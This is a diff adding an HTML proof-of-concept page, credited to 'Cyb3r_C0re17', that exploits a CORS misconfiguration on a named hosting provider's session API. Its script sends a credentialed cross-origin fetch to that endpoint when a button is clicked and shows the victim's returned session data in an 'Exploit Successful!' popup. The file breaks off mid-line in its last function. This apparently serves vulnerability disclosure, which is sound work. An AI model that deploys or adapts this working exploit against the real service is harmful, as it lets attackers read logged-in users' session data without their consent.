@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit PoC</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            margin-top: 100px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            color: red;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #responsePopup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50%;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: left;
+            font-size: 14px;
+            white-space: pre-wrap;
+        }
+        #responsePopup button {
+            display: block;
+            margin: 20px auto 0;
+            padding: 5px 15px;
+            font-size: 14px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #responsePopup button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>CORS Exploit by Cyb3r_C0re17</h1>
+    <p>Click the button below to exploit the CORS vulnerability.</p>
+    <button id="exploitButton">Exploit</button>
+
+    <div id="responsePopup">
+        <h3>Exploit Successful!</h3>
+        <div id="responseData"></div>
+        <button onclick="closePopup()">OK</button>
+    </div>
+
+    <script>
+        document.getElementById("exploitButton").addEventListener("click", function () {
+            fetch("https://my.ishosting.com/api/session", {
+                method: "GET",
+                credentials: "include" // Include cookies for authenticated requests
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                const responsePopup = document.getElementById("responsePopup");
+                const responseData = document.getElementById("responseData");
+                responseData.textContent = JSON.stringify(data, null, 4);
+                responsePopup.style.display = "block";
+            })
+            .catch(error => {
+                alert(`Exploit failed: ${error.message}`);
+            });
+        });
+
+        function closePopup() {
+            document.getElementById("responsePopup").style.display = "
